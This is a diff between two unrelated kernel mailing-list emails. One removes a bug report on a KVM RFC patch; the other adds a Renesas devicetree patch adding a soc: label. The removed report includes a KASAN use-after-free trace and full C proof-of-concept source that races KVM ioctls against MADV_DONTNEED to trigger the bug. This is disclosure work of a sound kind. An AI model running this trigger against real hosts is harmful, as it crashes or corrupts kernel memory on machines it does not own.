@@ -4,75 +4,77 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id DD723CD4F26
-	for <linux-arm-kernel@archiver.kernel.org>; Sun, 21 Jun 2026 00:03:11 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id A835ACD4F26
+	for <linux-arm-kernel@archiver.kernel.org>; Sun, 21 Jun 2026 02:51:18 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
 	:List-Post:List-Archive:List-Unsubscribe:List-Id:Content-Transfer-Encoding:
-	Content-Type:In-Reply-To:From:References:To:Subject:MIME-Version:Date:
-	Message-ID:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:Resent-From
-	:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
-	bh=vybCqDg9hWmZlNrhFz29JdNO2ituUhIKv68GCKK1pIE=; b=BGi6EhapaSJ+2P9QhRp7YtGg//
-	Dmda5vdKQ8W11wM+XHmxTyC9HT4lZ7tzDqu17d1oIIi+kfhqM5s81th78IrxrnlKhrypUZv7dB4ST
-	AWU3yAWsNCX661YBlhcT/FanoudSnzVEoFf9vN2TXAYJ9NiDlFxAT0soLuhOzs0lsKHAA47amwsqH
-	xRynG/2/Eo6/mPZisuHkhcN8/pAw6MyLKtI1YKo2ZinHhws5V1RX6rzz1D7Hj32C8NCGh7QWmWvTz
-	XaSip4YW5XAx+XiTzLUJxVSELUGAxxK7bHiNjQ2RQMKpfMWu49KTApy1odjzO/57BnPHmsMrIIZJo
-	7avWLH/Q==;
+	MIME-Version:Message-ID:Date:Subject:Cc:To:From:Reply-To:Content-Type:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
+	bh=kSewyVdrq5Z8GYr/rDJoeSXs5aNZIEnD4cWp+G2/tF8=; b=CYFRE53DrNQo207nkQ0X+ZCj+/
+	RN0UqU0r4bUijXx9qayPwVoMbaADgV3vnmTAswtKSrUTZKAldyaV2iSGGsGjWzdPtuRbKr33MdNia
+	tG/ArmQF4WFI4ZmwDC+930oyom9TU9Kkxv935kFTTeD9LunhuSPv+lwpFN8086SGl8wqkI3LgGxc0
+	Q58onm83BIQh/Iig92jd6wnbqkKO3mYgtnBhphTCuACA01KD9odBiIo/MYDSjHxijRktR43UD5d46
+	6e85WrAI5q7T0WnZjVscacJJvPWvBasO/RJkeazu/ypEmgIjor49Q3ZT+fRfrm3AOkcrg5PRsRJIu
+	u77QzZag==;
 Received: from localhost ([::1] helo=bombadil.infradead.org)
 	by bombadil.infradead.org with esmtp (Exim 4.99.1 #2 (Red Hat Linux))
-	id 1wb5eO-00000003e3L-0uT8;
-	Sun, 21 Jun 2026 00:03:00 +0000
-Received: from xmbghk7.mail.qq.com ([43.163.128.54])
+	id 1wb8H8-00000003hIL-16K0;
+	Sun, 21 Jun 2026 02:51:10 +0000
+Received: from mout-p-101.mailbox.org ([80.241.56.151])
 	by bombadil.infradead.org with esmtps (Exim 4.99.1 #2 (Red Hat Linux))
-	id 1wb5eK-00000003e2u-1eQa
+	id 1wb8H5-00000003hGn-1jWY
 	for linux-arm-kernel@lists.infradead.org;
-	Sun, 21 Jun 2026 00:02:58 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qq.com; s=s201512;
-	t=1782000168; bh=vybCqDg9hWmZlNrhFz29JdNO2ituUhIKv68GCKK1pIE=;
-	h=Date:Subject:To:References:From:In-Reply-To;
-	b=L2VjciTUQaPakfGZjn9TxPFCaiK97akAD4B6vblO2QYtVpoS7KNK/l4d3h9Lk0ja2
-	 0Mfh3bsHHaz01eZaA0if+Sm7/KMfM6yNhxY1T5G3bt523RfF2iTUbP1spW1lGk9lEV
-	 l/ywrVL1RiVhqn5Ukf04QG6JYyp2RghNaHMaNEWQ=
-Received: from [192.168.1.100] ([183.95.73.181])
-	by newxmesmtplogicsvrsza63-0.qq.com (NewEsmtp) with SMTP
-	id ADA4832; Sun, 21 Jun 2026 08:02:45 +0800
-X-QQ-mid: xmsmtpt1782000165ts5upz1q4
-Message-ID: <tencent_EFE0DC1B0750A4CB1C783F920F91CF10E309@qq.com>
-X-QQ-XMAILINFO: Nwte6vbuj0EqbknLZeEA4uc//0lXfg3aCZT28xlvppfzvfRWlcS17m5Mv2gmnM
-	 yDijvPooVf/2FSfVkWqbuVR4B6lQKTfdLQzfp/3lmlnYr55GHc1zdoenps6igG7+wnz0VELYEQTM
-	 /8e6Q4YtZCRzB83F8wnyyfd5RWqIrtV2efZLPqoButCTNfZA1j5zMPzv9NhP8HbWbybBzu1ClL98
-	 35sQomuc4SVH1lyY/DauVxfPJ2MbcrhS+fLrj0pubS0LkhX8uasdW1v4iV1eRzOU+AcPDrF0Jnsi
-	 uffGkxJW0OevkWmfWJ6tlqnHq4OKXjn8QIceLhsWQnLYHi8yAbApjBdXMBz/K6veY/13d5vjwQ1n
-	 WsmyK0jizKud5tdMvlpsUFjGhpS2sIxzc6FfIksFsTxRZlJ02F4BQ0230IXXPpPn2vVPxXbcKZY2
-	 GkyuQnt49LKiSJNvVWnOC27q2/1awSHyo2X2hIPvUoeRSSnaSnATTlMnlb8NYJMISWrR8qZmbxb8
-	 y37fvr6Xzms2A8N3jsKZ4I9JqJfaQVK88ynLr6XylkTHQupj9HwlZrJP1TBPtScCS1IHUbzsEoeI
-	 jYlK5cyDwGLs26M0sPILMeCwKDFUAgzBtoLcBVoT/y4V97pZq1afnLuHOhN5OsLosGcTwP+TyJGt
-	 Ni7e/ZTdAaRVNPAANXK5CQCNvlUro+HzSylBQYy/ZGFDKJ9K9+NpPCMCqqrjJi8lJ4w43cBY7cYR
-	 Gse+RGbXFQ+Fn5oLJfZgZRKievzzUDMHlHarzLhHXkA6QNcqURmcnKOwkIBVk39L10gulYmh7xlB
-	 McL/vMhpcPV6ECBYqcCU0Nr+rc3K7u6SBxsb8vA3Myvx5ehGHZfA7CNu+zOUKp3OmiB0NEnDCBXW
-	 iOenuq/yrrSJ257zWmw4/SNXAaZyHrW2KnqjJUfhpXip+6sz6shAhskTXGWxIxE6pwD0xpUfFGjm
-	 Y87B21fcqpCL3TZHeiu4292tyHcuiIqVOlxkIAbu5nqzYBxzpY0hfFOfv8ISjN5QxjU7Gz/6wxmr
-	 iGYXyUwgxDM5qajlmPmIWhWlxarJ6RPa4hRNhhOa6H/hOETGSI
-X-QQ-XMRINFO: MSVp+SPm3vtSI1QTLgDHQqIV1w2oNKDqfg==
-X-OQ-MSGID: <4babccaf-90b5-4bf6-8f82-7e5677fef024@qq.com>
-Date: Sun, 21 Jun 2026 08:02:45 +0800
+	Sun, 21 Jun 2026 02:51:08 +0000
+Received: from smtp2.mailbox.org (smtp2.mailbox.org [10.196.197.2])
+	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
+	 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
+	(No client certificate requested)
+	by mout-p-101.mailbox.org (Postfix) with ESMTPS id 4gjbS325vsz9tQr;
+	Sun, 21 Jun 2026 04:50:59 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mailbox.org; s=mail20150812;
+	t=1782010259;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:
+	 content-transfer-encoding:content-transfer-encoding;
+	bh=kSewyVdrq5Z8GYr/rDJoeSXs5aNZIEnD4cWp+G2/tF8=;
+	b=TEpLUK3nfD/QD9EAX4MjZabWcP3GEACdRIm5f9F8DiaxtfAYQBIb0ILayNGLBmto/9CPQq
+	eckqhADRhAkqB67MWbZPnNFL5uNC4+GHm3Y+CYXPhKb9LI2olUXeeOubyWFzDRiW6mPnSb
+	uOG9i/YUha/oW8XShNIbzyLsGYmyeEA9ZpbsEaVEbaJaqD0FByLPFyaXw2SU3yDYIC4Xds
+	qj1/pRE81hnobdpfRnUOUkRdClZBa0WIwSJZcWbiiIxZm5HgGBWPxRLfzNWbiy33o5ES4P
+	Lvni1hL7rujd+RvWf7BhFx5N/dnmv2cwkFqaY8FbaYKE/zm4DwPIYx5E/QfrSw==
+From: Marek Vasut <marek.vasut+renesas@mailbox.org>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=mailbox.org; s=mail20150812;
+	t=1782010257;
+	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
+	 to:to:cc:cc:mime-version:mime-version:
+	 content-transfer-encoding:content-transfer-encoding;
+	bh=kSewyVdrq5Z8GYr/rDJoeSXs5aNZIEnD4cWp+G2/tF8=;
+	b=AXeibP7dFiyq6WkCd9SOkrtu1OgQFBteCICEsSfJz+00zDHmFdjgBraPKW6x0N007M/DKx
+	JNeWNiSFQXwF1sj0EM9TIeTJFOM027PrDu84iHdsN/7gFm6ghrFti8nQkhRhf5GBdBNU9R
+	NfFxLK8XNq297WFLR4oYxyZ+2xXFNETPe4424yF24y1U3TgELXe83pyiThop5FpgzWnymm
+	fURnb5kyoBtRYzzNDoM/lzIPMyPeBUZ/6SwXUTPQOLwxyiPOB7jBrjjtjWqTEVkKSSoqXx
+	cGTdsomu6RjsZPVpJ3N45SNcPGV10F5sadtoZ/hxK5TsFIvU/uXjUSVOYyXrwQ==
+To: linux-arm-kernel@lists.infradead.org
+Cc: Marek Vasut <marek.vasut+renesas@mailbox.org>,
+	Conor Dooley <conor+dt@kernel.org>,
+	Geert Uytterhoeven <geert+renesas@glider.be>,
+	Krzysztof Kozlowski <krzk+dt@kernel.org>,
+	Rob Herring <robh@kernel.org>,
+	devicetree@vger.kernel.org,
+	linux-kernel@vger.kernel.org,
+	linux-renesas-soc@vger.kernel.org
+Subject: [PATCH 1/9] arm64: dts: renesas: r8a774a1: Add soc: label to soc node
+Date: Sun, 21 Jun 2026 04:50:21 +0200
+Message-ID: <20260621025052.406507-1-marek.vasut+renesas@mailbox.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [RFC PATCH] KVM: Ignore MMU notifiers for guest_memfd-only
- memslots
-To: Alexandru Elisei <alexandru.elisei@arm.com>, pbonzini@redhat.com,
- kvm@vger.kernel.org, linux-kernel@vger.kernel.org, maz@kernel.org,
- oupton@kernel.org, suzuki.poulose@arm.com, kvmarm@lists.linux.dev,
- linux-arm-kernel@lists.infradead.org, seanjc@google.com,
- david.hildenbrand@arm.com, mark.rutland@arm.com
-References: <20260615155244.183044-1-alexandru.elisei@arm.com>
-From: XIAO WU <xiaowu.417@qq.com>
-In-Reply-To: <20260615155244.183044-1-alexandru.elisei@arm.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 8bit
+X-MBO-RS-ID: a9cff52d3331e015f21
+X-MBO-RS-META: gkbhokzjgongtik374dd5xwnmpyrmonp
 X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.9.0 (BSD) ) MR-646709E3 
-X-CRM114-CacheID: sfid-20260620_170256_770456_F6C7EAA9 
-X-CRM114-Status: GOOD (  19.70  )
+X-CRM114-CacheID: sfid-20260620_195107_637192_3EDB19E8 
+X-CRM114-Status: GOOD (  10.07  )
 X-BeenThere: linux-arm-kernel@lists.infradead.org
 X-Mailman-Version: 2.1.34
 Precedence: list
@@ -87,232 +89,37 @@ List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-arm-kernel>,
 Sender: "linux-arm-kernel" <linux-arm-kernel-bounces@lists.infradead.org>
 Errors-To: linux-arm-kernel-bounces+linux-arm-kernel=archiver.kernel.org@lists.infradead.org
 
-Hi
+Add soc: label to the /soc {} node to align the DT with r8a77951.dtsi
+which already has that soc: label. The soc: label is useful in U-Boot
+where it is used in U-Boot extras DT fragments.
 
-I came across the Sashiko review in this thread and wanted to see if
-the pfncache UAF could be triggered in practice.  The short answer is:
-yes, it reproduces reliably with a multi-threaded PoC.  Below is the
-KASAN report and a brief description of the reproducer.
+Signed-off-by: Marek Vasut <marek.vasut+renesas@mailbox.org>
+---
+Cc: Conor Dooley <conor+dt@kernel.org>
+Cc: Geert Uytterhoeven <geert+renesas@glider.be>
+Cc: Krzysztof Kozlowski <krzk+dt@kernel.org>
+Cc: Rob Herring <robh@kernel.org>
+Cc: devicetree@vger.kernel.org
+Cc: linux-kernel@vger.kernel.org
+Cc: linux-renesas-soc@vger.kernel.org
+---
+ arch/arm64/boot/dts/renesas/r8a774a1.dtsi | 2 +-
+ 1 file changed, 1 insertion(+), 1 deletion(-)
 
-On Mon, Jun 15, 2026 at 04:52:44PM +0100, Alexandru Elisei wrote:
- > For guest_memfd-only memslots (kvm_memslot_is_gmem_only() is true), the
- > memory provider for the virtual machine is the guest_memfd file, not the
- > userspace mapping.
-...
- > @@ -592,6 +592,10 @@ static __always_inline kvm_mn_ret_t 
-kvm_handle_hva_range(struct kvm *kvm,
- >              unsigned long hva_start, hva_end;
- >
- >              slot = container_of(node, struct kvm_memory_slot, 
-hva_node[slots->node_idx]);
- > +
- > +            if (kvm_slot_has_gmem(slot) && 
-kvm_memslot_is_gmem_only(slot))
- > +                continue;
- > +
-
-This `continue` is the problem.  When the only memslot covering the
-HVA range is gmem-only, found_memslot stays false, and in
-invalidate_range_end, kvm_mmu_invalidate_end() is never called.
-That means mmu_invalidate_seq never increments.
-
-Meanwhile, the pfncache (used for guest pvclock) runs this retry
-protocol in hva_to_pfn_retry():
-
-     1. Capture mmu_seq
-     2. Drop gpc->lock
-     3. GUP + kmap (gets a page reference, creates kernel mapping)
-     4. kvm_release_page_clean(page) — drops the reference
-     5. Re-acquire gpc->lock
-     6. mmu_notifier_retry_cache() — checks if mmu_seq changed
-
-If step 6 sees the same seq, the stale kmap is kept even though the
-page was freed after step 4.  This is the UAF.
-
-[Reproduction]
-
-I rebuilt the kernel with CONFIG_KASAN=y and ran the PoC in a QEMU VM.
-The trigger is three threads racing concurrently:
-
-   - Thread 1 (T0): hammers KVM_RUN ioctls, forcing
-     kvm_guest_time_update → kvm_gpc_refresh → hva_to_pfn_retry
-   - Thread 2 (T1): cycles KVM_SET_MSRS to activate/deactivate the
-     pvclock pfncache, extending the race window
-   - Thread 3 (T2): hammers MADV_DONTNEED + write on the HVA, firing
-     MMU notifier invalidations while the memslot is gmem-only
-
-The full PoC source (poc.c) is attached at the end of this mail.
-Compiled with: gcc -o poc poc.c -static -lpthread
-
-[KASAN report — kernel 7.1.0-g0eb81d7f81ae #1, CONFIG_KASAN=y]
-
-   ==================================================================
-   BUG: KASAN: use-after-free in kvm_setup_guest_pvclock+0x632/0x680
-   Read of size 4 at addr ffff888116069000 by task poc/9520
-
-   CPU: 1 UID: 0 PID: 9520 Comm: poc Not tainted 7.1.0-g0eb81d7f81ae #1
-
-   Call Trace:
-    <TASK>
-    dump_stack_lvl+0x116/0x1f0
-    print_report+0xf4/0x600
-    kasan_report+0xe0/0x110
-    kvm_setup_guest_pvclock+0x632/0x680
-    kvm_guest_time_update+0x741/0x1090
-    vcpu_run+0x1c2a/0x5a80
-    kvm_arch_vcpu_ioctl_run+0x1029/0x18d0
-    kvm_vcpu_ioctl+0x772/0x1710
-    __x64_sys_ioctl+0x193/0x210           ← KVM_RUN
-    do_syscall_64+0x129/0x880
-    entry_SYSCALL_64_after_hwframe+0x77/0x7f
-
-   The buggy address belongs to the physical page:
-   page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x7ff24ab46
-
-   page last allocated via:
-    get_user_pages_unlocked → hva_to_pfn → __kvm_gpc_refresh
-      → kvm_gpc_refresh → kvm_setup_guest_pvclock
-
-   page last free pid 9520 tgid 9517 stack trace:
-    kvm_release_page_clean → __folio_put → __free_frozen_pages
-      ← __kvm_gpc_refresh ← kvm_gpc_refresh
-
-The allocation and free traces confirm the exact scenario from the
-review: the page is allocated by GUP during gpc refresh, then freed by
-kvm_release_page_clean() inside the same __kvm_gpc_refresh() call,
-and then kvm_setup_guest_pvclock still accesses it through the stale
-kmap.
-
-The crash reproduces within ~40 seconds of the PoC running.
-
-[Full PoC source]
-
-Compile: gcc -o poc poc.c -static -lpthread
-
-// SPDX-License-Identifier: GPL-2.0-only
-/*
-  * PoC for: KVM MMU notifier skip regression for guest_memfd-only memslots
-  *
-  * Concurrent threads create a race between gpc refresh (GUP → kmap →
-  * kvm_release_page_clean → retry check) and MMU invalidation (munmap /
-  * MADV_DONTNEED) on a gmem-only memslot where the invalidation doesn't
-  * increment mmu_invalidate_seq.
-  */
-#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <errno.h>
-#include <signal.h>
-#include <stdint.h>
-#include <sys/ioctl.h>
-#include <sys/mman.h>
-#include <pthread.h>
-#include <linux/kvm.h>
-
-#ifndef KVM_CAP_GUEST_MEMFD
-#define KVM_CAP_GUEST_MEMFD 234
-#endif
-#ifndef GUEST_MEMFD_FLAG_MMAP
-#define GUEST_MEMFD_FLAG_MMAP (1ULL << 0)
-#endif
-#ifndef MSR_KVM_SYSTEM_TIME_NEW
-#define MSR_KVM_SYSTEM_TIME_NEW 0x4b564d01
-#endif
-
-#define PAGE_SIZE 4096
-
-static volatile bool stop = false;
-static int vcpu_fd = -1;
-static unsigned long shared_hva = 0;
-
-static void sigint_handler(int sig) { stop = true; }
-
-static void *worker_thread(void *arg)
-{
-     int tid = (int)(long)arg;
-     for (int i = 0; !stop && i < 200000; i++) {
-         if (tid == 0)
-             ioctl(vcpu_fd, KVM_RUN, 0);
-         else if (tid == 1) {
-             struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
-sizeof(msrs->entries[0]));
-             if (msrs) {
-                 memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
-                 msrs->nmsrs = 1;
-                 msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
-                 msrs->entries[0].data = (i & 1) ? 0x1001 : 0x1000;
-                 ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
-                 free(msrs);
-             }
-         } else {
-             madvise((void*)shared_hva, PAGE_SIZE, MADV_DONTNEED);
-             *(volatile char*)shared_hva = 0x42;
-         }
-         if (i % 50000 == 0)
-             printf("[T%d] %d iterations\n", tid, i);
-     }
-     printf("[T%d] Done\n", tid);
-     return NULL;
-}
-
-int main(void)
-{
-     signal(SIGINT, sigint_handler);
-     signal(SIGTERM, sigint_handler);
-
-     int kvm_fd = open("/dev/kvm", O_RDWR);
-     int vm_fd = ioctl(kvm_fd, KVM_CREATE_VM, 0);
-
-     struct kvm_create_guest_memfd gmem_cmd = { .size = PAGE_SIZE, 
-.flags = GUEST_MEMFD_FLAG_MMAP };
-     int gmem_fd = ioctl(vm_fd, KVM_CREATE_GUEST_MEMFD, &gmem_cmd);
-
-     void *anon = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
-                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
-     memset(anon, 0xAA, PAGE_SIZE);
-     shared_hva = (unsigned long)anon;
-
-     struct kvm_userspace_memory_region2 mem = {
-         .slot = 0, .flags = KVM_MEM_GUEST_MEMFD,
-         .guest_phys_addr = 0x1000, .memory_size = PAGE_SIZE,
-         .userspace_addr = shared_hva,
-         .guest_memfd_offset = 0, .guest_memfd = gmem_fd,
-     };
-     ioctl(vm_fd, KVM_SET_USER_MEMORY_REGION2, &mem);
-
-     vcpu_fd = ioctl(vm_fd, KVM_CREATE_VCPU, 0);
-     size_t mmap_size = ioctl(kvm_fd, KVM_GET_VCPU_MMAP_SIZE, 0);
-     struct kvm_run *vcpu_run = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE,
-                                     MAP_SHARED, vcpu_fd, 0);
-
-     /* Pre-activate pfncache via MSR */
-     struct kvm_msrs *msrs = malloc(sizeof(*msrs) + 
-sizeof(msrs->entries[0]));
-     memset(msrs, 0, sizeof(*msrs) + sizeof(msrs->entries[0]));
-     msrs->nmsrs = 1;
-     msrs->entries[0].index = MSR_KVM_SYSTEM_TIME_NEW;
-     msrs->entries[0].data = 0x1001;
-     ioctl(vcpu_fd, KVM_SET_MSRS, msrs);
-     free(msrs);
-
-     pthread_t threads[3];
-     for (int i = 0; i < 3; i++)
-         pthread_create(&threads[i], NULL, worker_thread, (void *)(long)i);
-
-     sleep(40);
-     stop = true;
-     for (int i = 0; i < 3; i++)
-         pthread_join(threads[i], NULL);
-
-     printf("[*] Done. Check dmesg for KASAN UAF.\n");
-     return 0;
-}
-
-Thanks,
-XIAOWU
-
+diff --git a/arch/arm64/boot/dts/renesas/r8a774a1.dtsi b/arch/arm64/boot/dts/renesas/r8a774a1.dtsi
+index 36675f5bcdeaf..e66d86db6e6c4 100644
+--- a/arch/arm64/boot/dts/renesas/r8a774a1.dtsi
++++ b/arch/arm64/boot/dts/renesas/r8a774a1.dtsi
+@@ -262,7 +262,7 @@ scif_clk: scif {
+ 		clock-frequency = <0>;
+ 	};
+ 
+-	soc {
++	soc: soc {
+ 		compatible = "simple-bus";
+ 		bootph-all;
+ 
+-- 
+2.53.0
 
 
